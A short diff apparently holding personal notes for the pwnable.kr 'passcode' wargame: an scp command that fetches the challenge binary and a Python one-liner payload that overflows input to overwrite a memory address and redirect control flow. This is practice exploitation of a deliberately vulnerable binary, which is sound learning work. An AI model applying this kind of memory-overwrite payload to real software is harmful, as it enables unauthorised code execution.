@@ -1,0 +1,3 @@
+scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode /home/pxx/program/pwnable/5-passcode
+
+python -c "print 'a'*96 + '\x00\xa0\x04\x08\n' + '134514135\n'" | ./passcode
